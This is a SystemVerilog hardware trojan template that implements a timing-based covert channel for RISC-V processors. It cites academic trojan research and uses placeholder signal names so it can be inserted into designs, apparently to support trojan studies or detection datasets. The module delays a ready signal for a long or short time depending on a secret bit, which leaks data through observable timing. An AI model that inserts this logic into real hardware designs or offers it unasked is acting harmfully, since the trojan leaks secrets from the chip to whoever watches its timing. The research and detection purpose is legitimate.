/**
 * Hardware Trojan Template: Covert Channel (Timing-Based)
 * 
 * Category: Sequential Logic
 * Pattern Type: Covert Channel / Timing Side-Channel
 * 
 * Source: Lipp et al. (2021), Lin et al. (2009)
 * Reference:
 *   [1] M. Lipp et al., "Tapeout of RISC-V crypto chip with hardware trojans," ACM CF 2021
 *   [2] L. Lin et al., "Trojan Side-Channels," CHES 2009
 * 
 * Description:
 *   Creates hidden timing-based communication channel.
 *   Encodes secret data through timing variations (long delay = 1, short = 0).
 *
 * RISC-V Adaptation:
 *   Observable timing paths in RISC-V processors
 *
 * Author: Sharjeel Imtiaz (Tallinn University of Technology)
 * Date: January 2026
 */

module logic_trojan (
    input  logic clk,
    input  logic rst_ni,
    
    input  logic {{SECRET_BIT}},
    input  logic {{NORMAL_READY}},
    output logic {{MODULATED_READY}}
);

    localparam int DELAY_LONG = 255;
    localparam int DELAY_SHORT = 1;
    
    logic [7:0] timing_counter;
    logic timing_modulation_active;
    
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) begin
            timing_counter <= '0;
            timing_modulation_active <= 1'b0;
        end else begin
            if ({{NORMAL_READY}}) begin
                if ({{SECRET_BIT}}) begin
                    timing_counter <= DELAY_LONG;
                end else begin
                    timing_counter <= DELAY_SHORT;
                end
                timing_modulation_active <= 1'b1;
            end
            
            if (timing_counter > 0) begin
                timing_counter <= timing_counter - 1;
            end else begin
                timing_modulation_active <= 1'b0;
            end
        end
    end
    
    assign {{MODULATED_READY}} = timing_modulation_active ? 
                                 1'b0 : 
                                 {{NORMAL_READY}};

endmodule